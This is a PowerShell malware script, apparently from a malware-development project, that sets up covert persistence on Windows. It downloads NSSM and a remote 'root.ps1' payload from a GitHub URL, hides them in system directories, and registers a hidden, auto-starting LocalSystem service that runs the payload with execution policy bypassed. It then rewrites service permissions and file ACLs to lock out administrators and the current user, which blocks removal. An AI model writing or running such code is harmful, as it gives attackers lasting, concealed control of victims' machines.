# script must run as admin/SYSTEM
param(
    [string]$rootScriptPath,
    [string]$basePath
)
$basePath = $basePath -replace '([\\{}])', '`$1'
echo $basePath >> "C:\Users\maldev\Downloads\init_root.txt"
$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$serviceName = "MyRootService"
$downloadPath = "$env:temp\nssm.zip"
$propertyName = "root"
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)
if(($rootScriptPath -eq $null) -or ($rootScriptPath -eq "")){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $rootScriptPath = $paths[$idx]
    $rootScriptPath = "$rootScriptPath\root.ps1"
    Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootScriptPath -Force | Out-Null
}

$exePath = "powershell.exe"
$arguments = "-ep bypass -noP -w hidden $rootScriptPath -basePath $basePath"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe -PathType Leaf)){
    if(-not(Test-Path -Path $downloadPath)){
        iwr -Uri $nssmUrl -OutFile $downloadPath
    }
    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe -Force
}

if(-not(Test-Path -Path $rootScriptPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootScriptPath
}

Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\root_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\root_srv.log"
& $nssmexe start $serviceName

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $nssmFolder /A /R /D Y 2>&1 | Out-Null
takeown /F $rootScriptPath /A /R /D Y 2>&1 | Out-Null

#  Set SYSTEM as owner (prevents inheritance)
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null

# Remove inheritance and grant SYSTEM full control
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null

# Remov all other users/groups (optional safety measure)
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null

# 4. Explicitly remove your user account
icacls $nssmFolder /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
icacls $rootScriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null



#attrib +h +s +r $nssmFolder
#attrib +h +s +r $rootScriptPath